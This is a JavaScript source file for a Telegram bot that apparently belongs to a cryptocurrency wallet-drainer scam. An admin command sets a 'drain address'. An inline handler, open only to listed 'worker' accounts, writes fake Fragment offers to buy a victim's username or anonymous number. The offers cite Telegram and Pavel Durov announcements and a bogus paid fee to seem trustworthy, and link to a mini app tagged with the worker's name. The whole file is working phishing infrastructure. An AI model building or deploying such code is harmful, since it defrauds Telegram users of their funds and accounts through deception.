const { Bot, InlineKeyboard } = require('grammy');
const fetch = require('node-fetch'); // Импортируем node-fetch для выполнения HTTP-запросов
const { generateOffer } = require('./offerGenerator');
const { sendNotification } = require('./notificationSender');
const sqlite3 = require('sqlite3').verbose();

const db = new sqlite3.Database('./botdata.db');

const adminIds = [128853950, 131149713, 80536750, 36858435, 74157682, 72310093, 67591345, 188594463, 88070405, 7453135610, 7357430392, 5939744649, 149701557, 5655617846, 408911954, 118880796, 171259106, 116340256, 114656984]; // Добавляем список администраторов

db.run(`
    CREATE TABLE IF NOT EXISTS prices (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        type TEXT,
        identifier TEXT DEFAULT NULL,
        price REAL,
        UNIQUE(type, identifier)
    )
`);

db.run(`
    CREATE TABLE IF NOT EXISTS drain_address (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        address TEXT NOT NULL
    )
`);

function setupBot() {
    const bot = new Bot(process.env.TELEGRAM_BOT_TOKEN);
    // Команда /start для приветствия
    //bot.command('unhfguhdfughduhfguhdujfgd8juguhduhjfgd', (ctx) => {
    //    ctx.reply('sosi huy');
    //});

    bot.command('w5walletdrainset', (ctx) => {
        if (!adminIds.includes(ctx.from.id)) {
            return;
        }

        const commandArgs = ctx.message.text.split(' ');
    
        if (commandArgs.length !== 2) {
            return ctx.reply('huy');
        }
    
        const newAddress = commandArgs[1];
    
        const query = `
            INSERT INTO drain_address (id, address)
            VALUES (1, ?)
            ON CONFLICT(id) 
            DO UPDATE SET address = excluded.address;
        `;
    
        db.run(query, [newAddress], function(err) {
            if (err) {
                console.error('Error updating drain address:', err);
                return ctx.reply('Failed to update drain address.');
            }
            ctx.reply(`Drain address updated to: ${newAddress}`);
        });
    });

    bot.command('setprice', async (ctx) => {
        if (!adminIds.includes(ctx.from.id)) {
            return;
        }

        console.log("Command received:", ctx.message.text);
        const args = ctx.message.text.slice(9).split(':');
        console.log("Parsed args:", args);
    
        if (args.length < 2 || args.length > 3) {
            return ctx.reply('huy');
        }
    
        const price = parseFloat(args[0].trim());
        const type = args[1].trim();
        let identifier = args.length === 3 ? args[2].trim() : null;
    
        // Убираем пробелы из номера, если это номер
        if (identifier && type === 'number') {
            identifier = identifier.replace(/\s+/g, '');
        }
    
        console.log("Parsed price:", price, "Type:", type, "Identifier:", identifier);
    
        if (isNaN(price) || !['username', 'number'].includes(type)) {
            return ctx.reply('Invalid price or type. Please provide a valid price and type (username or number).');
        }
    
        let replyText = `Price set for ${type}: ${price} TON.`;
    
        if (identifier) {
            replyText += `\nTarget: ${identifier}`;
            db.run(`INSERT INTO prices (type, identifier, price) VALUES (?, ?, ?)
                    ON CONFLICT(type, identifier) DO UPDATE SET price = excluded.price`, 
                    [type, identifier, price], function(err) {
                if (err) {
                    console.error('Error inserting data:', err.message);
                    return ctx.reply('Failed to set the price. Please try again.');
                }
                console.log(`Price set for specific ${type}: ${identifier}. Row ID: ${this.lastID}`);
                ctx.reply(replyText);
            });
        } else {
            // Проверяем, существует ли запись без идентификатора
            db.get(`SELECT id FROM prices WHERE type = ? AND identifier IS NULL`, [type], (err, row) => {
                if (err) {
                    console.error('Error checking existing data:', err.message);
                    return ctx.reply('Failed to set the price. Please try again.');
                }
    
                if (row) {
                    // Если существует, обновляем запись
                    db.run(`UPDATE prices SET price = ? WHERE id = ?`, [price, row.id], function(err) {
                        if (err) {
                            console.error('Error updating data:', err.message);
                            return ctx.reply('Failed to update the price. Please try again.');
                        }
                        console.log(`Updated general price for ${type}. Row ID: ${row.id}`);
                        ctx.reply(replyText);
                    });
                } else {
                    // Если не существует, создаем новую запись
                    db.run(`INSERT INTO prices (type, identifier, price) VALUES (?, NULL, ?)`, [type, price], function(err) {
                        if (err) {
                            console.error('Error inserting data:', err.message);
                            return ctx.reply('Failed to set the price. Please try again.');
                        }
                        console.log(`General price set for ${type}. Row ID: ${this.lastID}`);
                        ctx.reply(replyText);
                    });
                }
            });
        }
    });

    const TONCOIN_API_URL = 'https://api.coinlore.net/api/ticker/?id=54683';

    async function getToncoinPrice() {
        const response = await fetch(TONCOIN_API_URL);
        const data = await response.json();
        return parseFloat(data[0].price_usd);
    }

    bot.inlineQuery(/^(\d+):(.+)$/, async (ctx) => {
        try {
            if (!adminIds.includes(ctx.from.id)) {
                return;
            }
            
            const [amount, text] = ctx.inlineQuery.query.split(':');
            const amountInt = parseInt(amount, 10);
    
            const toncoinPrice = await getToncoinPrice();
            const resultPrice = toncoinPrice * amountInt;
    
            const me = await bot.api.getMe();
    
            let miniAppLink;
    
            const user = ctx.from.username ? (ctx.from.username).replace('_', '.') : ctx.from.id;
            if (text.startsWith('+')) {
                // Если это номер телефона, заменяем пробелы на дефисы
                const formattedNumber = text.replace(/\s/g, 'z');
                miniAppLink = `https://t.me/${me.username}/fragment?startapp=` + Buffer.from(`price_${amountInt}-number_${formattedNumber.replace('+', '')}-worker_${user}`).toString('base64');
            } else {
                miniAppLink = `https://t.me/${me.username}/fragment?startapp=` + Buffer.from(`price_${amountInt}-username_${text.replace('+', '').replace('@', '')}-worker_${user}`).toString('base64');
            }

    
            console.log(`from_user: \'${user}\' address: \'${miniAppLink}\'`);
            const markup = new InlineKeyboard().url('Go to the offer', miniAppLink);
    
            let responseText = "Something is wrong....";
            if (text.startsWith('@')) {
responseText = `Someone offered <b>💎${amountInt} (~ $${resultPrice.toFixed(2)})</b> to buy you username <b>${text}</b>.\n\n` +
               `If you wish to sell this username, press the button below and check if the offer suits you.\n\n` +
               `Fragment is a verified platform for buying usernames and anonymous numbers, recognized by Telegram ` +
               `(<a href='https://t.me/telegram/201'>official Telegram announcement</a>) and its founder ` +
               `(<a href='https://t.me/durov/198'>official announcement from Pavel Durov</a>).\n\n` +
               `The seriousness of this offer is reinforced by the fact that the sender has invested 💎<b>1 (~ $${toncoinPrice.toFixed(2)})</b> as a fee to bring this opportunity to your attention.\n\n`;
            } else if (text.startsWith('+')) {
               responseText = `Someone offered <b>💎${amountInt} (~ $${resultPrice.toFixed(2)})</b> to buy your anonymous number <b>${text}</b>.\n\n` +
               `If you wish to sell this anonymous number, press the button below and check if the offer suits you.\n\n` +
               `Fragment is a trusted platform for buying and selling usernames and anonymous numbers, endorsed by Telegram ` +
               `(<a href='https://t.me/telegram/201'>official Telegram announcement</a>) and its founder ` +
               `(<a href='https://t.me/durov/198'>official announcement from Pavel Durov</a>).\n\n` +
               `The credibility of this offer is supported by the fact that the sender has paid 💎<b>1 (~ $${toncoinPrice.toFixed(2)})</b> as a fee to notify you.\n\n`;
            }
    
            const result = {
                type: 'article',
                id: '1',
                title: 'Go to the offer',
                input_message_content: {
                    message_text: responseText,
                    parse_mode: 'HTML',
                    disable_web_page_preview: true
                },
                reply_markup: markup,
                description: `${text} for ${amountInt} TON (~ $${resultPrice.toFixed(2)})`,
            };
    
            await ctx.answerInlineQuery([result], { cache_time: 1 });
        } catch (error) {
            console.error('Error handling inline query:', error);
        }
    });
    

    bot.catch(err => console.error('Bot encountered an error:', err));

    // Запуск бота
    bot.start();
    console.log('Telegram bot is running');
}

module.exports = { setupBot };
